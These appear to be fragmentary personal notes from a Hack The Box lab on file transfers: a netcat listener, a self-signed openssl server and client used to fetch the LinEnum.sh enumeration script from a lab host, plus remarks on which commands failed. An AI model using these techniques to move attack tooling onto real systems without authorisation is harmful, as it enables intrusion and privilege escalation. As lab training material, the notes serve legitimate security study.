...
```shell-session
0xxNosystemisSafe@htb[/htb]$ sudo nc -lvnp 8000
...
```shell-session
0xxNosystemisSafe@htb[/htb]$ openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out certificate.pem
...
```shell-session
0xxNosystemisSafe@htb[/htb]$ openssl s_server -quiet -accept 80 -cert certificate.pem -key key.pem < /tmp/LinEnum.sh
```
...
```shell-session
0xxNosystemisSafe@htb[/htb]$ openssl s_client -connect 10.10.10.32:80 -quiet > LinEnum.sh
```

**while downloading i encountered error regarding the self signed certificate** 
**![[Pasted image 20241201000557.png]]**
i am skipping this method bcz its not working 
...
**the command with -verifyctl flag is not working , i tried -urlcache and it works fine .** 
